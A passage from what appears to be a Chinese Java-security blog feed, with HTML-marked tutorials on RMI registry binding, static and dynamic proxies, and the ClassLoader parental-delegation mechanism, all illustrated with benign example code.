class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建远程对象</span></span><br><span class="line"><span class="type">HelloService</span> <span class="variable">service1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>(<span class="string">&quot;service1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式1:调用 java.i.registry.Registy 接口的 bind 或 rebind 方法</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.rebind(<span class="string">&quot;HelloService1&quot;</span>, service1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式2:调用命名服务类 java.rmi.Naming 的 bind 或 rebind 方法</span></span><br><span class="line">Naming.rebind(<span class="string">&quot;HelloService1&quot;</span>， service1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式3:调用 JNDI API 的 javax.naming.Context 接口的 bind 或rebind 方法</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">namingContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">namingContext.rebind(<span class="string">&quot;rmi:HelloService1&quot;</span>, service1);</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.RMItest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="comment">//获取到注册表的代理</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//利用注册表的代理去查询远程注册表中名为hello的对象</span></span><br><span class="line">        <span class="type">hello</span> <span class="variable">hello</span> <span class="operator">=</span> (hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">//调用远程方法</span></span><br><span class="line">        System.out.println(hello.welcome(<span class="string">&quot;lsl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后先运行服务端，再运行客户端</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc386c4e52.png" alt="image-20240506211855563.png"></p><p>参考：<a href="https://xz.aliyun.com/t/9261?time__1311=n4+xuDgD9DyDRGD07+D/jeKxiwrL879D0rD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/9261?time__1311=n4%2BxuDgD9DyDRGD07%2BD%2FjeKxiwrL879D0rD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><p><a href="https://blog.csdn.net/cold___play/article/details/132086492">https://blog.csdn.net/cold___play/article/details/132086492</a></p><p><a href="https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93">https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93</a></p><p><a href="https://javasec.org/javase/RMI/#rmi%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%B5%8B%E8%AF%95">https://javasec.org/javase/RMI/#rmi%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%B5%8B%E8%AF%95</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态代理机制</title>
      <link href="/2024/06/03/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/03/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="动态代理机制"><a href="#动态代理机制" class="headerlink" title="动态代理机制"></a>动态代理机制</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Java的自带jdk动态代理机制，位于java.lang.reflect.proxy包中，其本质实现是通过反射执行invoke方法来动态获取执行方法。代理模式是Java中最常用的设计模式之一。其特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。而Java的代理机制分为静态代理和动态代理。</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c107585.png" alt="image-20240428175805043.png"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理在编译使用时,定义接口或者父类,被代理对象与代理对象一起实现相同的接口或者是继承相同父类。用一个出租房子作为实例讲解。</p><p>定义一个接口</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title">Rental</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sale</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="委托类"><a href="#委托类" class="headerlink" title="委托类"></a>委托类</h3><p>&#x2F;&#x2F; 委托类，实现接口的方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entrust</span> <span class="keyword">implements</span> <span class="title class_">Rental</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">sale</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AgentRental</span> <span class="keyword">implements</span> <span class="title">Rental</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Rental <span class="keyword">target</span>; <span class="comment">// 被代理对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AgentRental</span><span class="params">(Rental <span class="keyword">target</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">target</span> = <span class="keyword">target</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">sale</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租价位有1k-3k&quot;</span>); <span class="comment">// 增加新的操作</span></span><br><span class="line">        <span class="keyword">target</span>.sale(); <span class="comment">// 调用Entrust委托类的sale方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>Rental</code> 接口中的 <code>sale()</code> 方法实现：由于实际传入的是 <code>Entrust</code> 类的实例，因此运行时会执行 <code>Entrust</code> 类中 <code>sale()</code> 方法的实现。</p><p><strong>测试类</strong></p><p>&#x2F;&#x2F; 测试类，生成委托类实例对象，并将该对象传入代理类构造函数中。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// 静态代理使用示例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">consumer</span>(<span class="params">Rental subject</span>) &#123;</span><br><span class="line">        subject.<span class="title function_">sale</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="title class_">Rental</span> test = <span class="keyword">new</span> <span class="title class_">Entrust</span>();</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;---使用代理之前---&quot;</span>);</span><br><span class="line">        <span class="title function_">consumer</span>(test);</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;---使用代理之后---&quot;</span>);</span><br><span class="line">        <span class="title function_">consumer</span>(<span class="keyword">new</span> <span class="title class_">AgentRental</span>(test));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c162167.png" alt="image-20240428184041251.png"></p><p>以上例子说明了在静态代理的优点，我们可以在不改变Entrust委托类源代码的情况下 ,通过AgentRental代理类来修改Entrust委托类的功能，从而实现“代理”操作。在进行代理后，自定义说明房子出租价位有1k-3k的操作方法。</p><p>但这个是我们通过代理类进行实现更改的方法，如果当我们需要过多的代理类对委托类进行修改的情况下，则可能出现下图情况:</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c15687f.png" alt="image-20240428184059829.png"></p><p>这个图说明了静态代理的缺点：</p><p>当我们的接口类需要增加和删除方式的时候，委托类和代理类都需要更改，不容易维护。同时如果需要代理多个类的时候，每个委托类都要编写一个代理类，会导致代理类繁多，不好管理。</p><p>因为java静态代理是对类进行操作的，我们需要一个个代理类去实现对委托类的更改操作，针对这个情况，我们可以利用动态代理来解决，通过程序运行时自动生成代理类。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>代理类在程序运行时创建的代理方式被成为动态代理。我们上面静态代理的例子中，代理类是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。</p><p>Java动态代理位于Java.lang.reflect包下，我们一般就仅涉及Java.lang.reflect.Proxy类与InvocationHandler接口,使用其配合反射，完成实现动态代理的操作。</p><p>InvocationHandler接口：负责提供调用代理操作。</p><p>当通过代理对象调用任何方法时，这个方法都会被自动委托给<code>InvocationHandler</code>的<code>invoke</code>方法来执行，我们可以通过覆盖<code>invoke</code>方法，添加新的代理行为或修改现有行为，无需修改目标类或已有代理类，这也是动态代理相较于静态代理的优点。</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c1b8fdd.png" alt="image-20240429110531986.png"></p><p>Proxy类：负责动态构建代理类</p><p>提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c1bbfe9.png" alt="image-20240429110540235.png"></p><p>getProxyClass(ClassLoader,Class&lt;?&gt;…)：获取指定类加载器和动态代理类对象。</p><p>newProxyInstance(ClassLoader,Class&lt;?&gt;[],InvocationHandler)：指定类加载器，一组接口，调用处理器；</p><p>isProxyClass(Class&lt;?&gt;)：判断获取的类是否为一个动态代理类;</p><p>getInvocationHandler(Object)：获取指定代理类实例查找与它相关联的调用处理器实例;</p><h2 id="动态代理实现过程"><a href="#动态代理实现过程" class="headerlink" title="动态代理实现过程"></a>动态代理实现过程</h2><p>1、使用java.lang.InvocationHandler接口创建自定义调用处理器，由它来实现invoke方法，执行代理函数；</p><p>2、使用java.lang.reflect.Proxy类指定一个ClassLoader，一组interface接口和一个InvocationHandler；</p><p>3、通过反射机制获得动态代理类的构造方法，其唯一参数类型是调用处理器接口类型；</p><p>4、调用java.lang.reflect.Proxy.newProxyInstance()方法，分别传入类加载器，被代理接口，调用处理器；创建动态代理实例对象。</p><p>5、通过代理对象调用目标方法；</p><p>以下面的实例进行分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Rental</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//委托类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entrust</span> <span class="keyword">implements</span> <span class="title class_">Rental</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAgent</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// target变量为委托类对象</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestAgent</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实现 java.lang.reflect.InvocationHandler.invoke()方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 添加自定义的委托逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租价位有1k-3k&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用委托类的方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取Entrust委托类的实例对象</span></span><br><span class="line">        <span class="type">Entrust</span> <span class="variable">testEntrust</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entrust</span>();</span><br><span class="line">        <span class="comment">// 获取testEntrust实例的类加载器，用于加载动态生成的代理类</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> testEntrust .getClass().getClassLoader();</span><br><span class="line">        <span class="comment">// 获取testEntrust实现的所有接口，为了动态代理能实现相同的接口</span></span><br><span class="line">        Class[] interfaces = testEntrust .getClass().getInterfaces();</span><br><span class="line">        <span class="comment">// 创建了一个TestAgent实例，传入testEntrust作为参数，这个实例将成为代理实例的调用处理者</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestAgent</span>(testEntrust);</span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="type">Rental</span> <span class="variable">proxy</span> <span class="operator">=</span> (Rental) Proxy.newProxyInstance(classLoader,interfaces,invocationHandler);</span><br><span class="line">        <span class="comment">// 调用代理对象的sale()方法</span></span><br><span class="line">        proxy.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc2c1bbcca.png" alt="image-20240429140153884.png"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/9197?time__1311=n4+xuDgD9DyDnB7QGQD/D0WoQ+k+7D02xAKmdex&alichlgref=https://xz.aliyun.com/u/24696#toc-3">JAVA安全基础（三）– java动态代理机制</a></p><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">java动态代理实现与原理详细分析</a></p><p><a href="https://blog.csdn.net/u011784767/article/details/78281384">详解java动态代理机制以及使用场景(一)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类加载机制</title>
      <link href="/2024/06/03/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/03/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="类加载机制（ClassLoader）"><a href="#类加载机制（ClassLoader）" class="headerlink" title="类加载机制（ClassLoader）"></a>类加载机制（ClassLoader）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Java类加载器(Java Classloader)是Java运行时环境(Java Runtime  Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成与平台无关的类文件，也就是Class文件（这样可以同时在unix系统和windows系统下运行），在运行的时候JVM通过类加载机制来加载Class文件（Class文件中就是字节码），转换为可在JVM内部使用的数据结构（类模板或类定义），所以ClassLoader十分重要，没有这个，java文件就无法运行。</p><h2 id="类文件编译过程"><a href="#类文件编译过程" class="headerlink" title="类文件编译过程"></a>类文件编译过程</h2><p><img src="https://img.picui.cn/free/2024/06/03/665dc1e5a9ffb.png" alt="image-20240427213500083.png"></p><p>我们以上图为例子，比如我们创建一个ClassLoaderTest.java文件运行，经过javac编译，然后生成ClassLoaderTest.class文件。这个java文件和生成的class文件都是存储在我们的磁盘当中。但如果我们需要将磁盘中的class文件在java虚拟机内存中运行，需要经过一系列的类的生命周期（加载、连接（验证–&gt;准备–&gt;解析）和初始化操作，最后就是我们的java虚拟机内存使用自身方法区中字节码二进制数据去引用堆区的Class对象。</p><p>通过这个流程图，我们就很清楚地了解到类的加载就是由java类加载器实现的，作用将类文件进行动态加载到java虚拟机内存中运行。</p><h2 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a>类加载隔离</h2><p>在大型应用系统中，常常需要同时运行不同版本的库或者组件，类加载隔离就可以使得不同版本的类库可以在同一JVM中并存而互不影响，避免了因类库版本冲突导致的应用崩溃。<strong>每个类加载器都有自己的命名空间，即使两个加载器加载了相同全限定名的类，只要加载它们的加载器不同，那么这两个类就被认为是不同的类实体</strong>。创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。</p><p><img src="https://javasec.oss-cn-hongkong.aliyuncs.com/images/202110251829223.png" alt="image-20211025171150475"></p><h3 id="JVM类加载器分类"><a href="#JVM类加载器分类" class="headerlink" title="JVM类加载器分类"></a>JVM类加载器分类</h3><h4 id="引导类加载器-BootstrapClassLoader"><a href="#引导类加载器-BootstrapClassLoader" class="headerlink" title="引导类加载器(BootstrapClassLoader)"></a>引导类加载器(BootstrapClassLoader)</h4><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，并不是Java类，所以在Java中无法直接获取到其实例。它属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p><h4 id="扩展类加载器-ExtensionsClassLoader"><a href="#扩展类加载器-ExtensionsClassLoader" class="headerlink" title="扩展类加载器(ExtensionsClassLoader)"></a>扩展类加载器(ExtensionsClassLoader)</h4><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p><h4 id="App类加载器-系统类加载器（AppClassLoader）"><a href="#App类加载器-系统类加载器（AppClassLoader）" class="headerlink" title="App类加载器&#x2F;系统类加载器（AppClassLoader）"></a>App类加载器&#x2F;系统类加载器（AppClassLoader）</h4><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。</p><h4 id="自定义类加载器-UserDefineClassLoader"><a href="#自定义类加载器-UserDefineClassLoader" class="headerlink" title="自定义类加载器(UserDefineClassLoader)"></a>自定义类加载器(UserDefineClassLoader)</h4><p>自定义类加载器(UserDefineClassLoader)，除了上述java自带提供的类加载器，我们还可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p><p><strong>如果没有特别指定或自定义类加载器，通常默认使用的就是系统类加载器（Application ClassLoader）</strong></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>通常情况下，我们就可以使用JVM默认三种类加载器进行相互配合使用，且是按需加载方式，就是我们需要使用该类的时候，才会将生成的Class文件加载到内存当中生成Class对象进行使用，且加载过程使用的是双亲委派模式，即把需要加载的类交由父加载器进行处理。关系图：</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc1e5aa046.png" alt="image-20240427215817916.png"></p><p>如上图类加载器层次关系，我们可以将其称为类加载器的双亲委派模型。但注意的是，他们之间并不是”继承”体系，而是委派体系。当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用，这样可以避免有些类被重复加载。</p><h2 id="CLassLoader类核心方法"><a href="#CLassLoader类核心方法" class="headerlink" title="CLassLoader类核心方法"></a>CLassLoader类核心方法</h2><p>除了上述BootstrapClassLoader，其他类加载器都是继承了CLassLoader类，我们就一起看看其类的核心方法。以下代码都是截取了其方法的源码。</p><h3 id="1、loadClass：加载指定的java类"><a href="#1、loadClass：加载指定的java类" class="headerlink" title="1、loadClass：加载指定的java类"></a>1、loadClass：加载指定的java类</h3><p>下面是这个类的示例，这个例子也可以帮助我们理解Java类加载机制的流程。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">Class</span>&lt;?&gt; loadClass(String <span class="type">name</span>, <span class="type">boolean</span> resolve)</span><br><span class="line">        throws ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        synchronized (getClassLoadingLock(<span class="type">name</span>)) &#123;</span><br><span class="line">            // First, <span class="keyword">check</span> <span class="keyword">if</span> the <span class="keyword">class</span> has already been loaded</span><br><span class="line">            <span class="keyword">Class</span> c = findLoadedClass(<span class="type">name</span>);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                long t0 = <span class="keyword">System</span>.nanoTime();</span><br><span class="line">                try &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(<span class="type">name</span>, <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(<span class="type">name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    // ClassNotFoundException thrown <span class="keyword">if</span> <span class="keyword">class</span> <span class="keyword">not</span> <span class="built_in">found</span></span><br><span class="line">                    // <span class="keyword">from</span> the non-<span class="keyword">null</span> parent <span class="keyword">class</span> loader</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    // <span class="keyword">If</span> still <span class="keyword">not</span> <span class="built_in">found</span>, <span class="keyword">then</span> invoke findClass <span class="keyword">in</span> <span class="keyword">order</span></span><br><span class="line">                    // <span class="keyword">to</span> find the <span class="keyword">class</span>.</span><br><span class="line">                    long t1 = <span class="keyword">System</span>.nanoTime();</span><br><span class="line">                    c = findClass(<span class="type">name</span>);</span><br><span class="line"></span><br><span class="line">                    // this <span class="keyword">is</span> the defining <span class="keyword">class</span> loader; <span class="type">record</span> the stats</span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>ClassLoader</code>加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类<code>loadClass</code>重要流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap 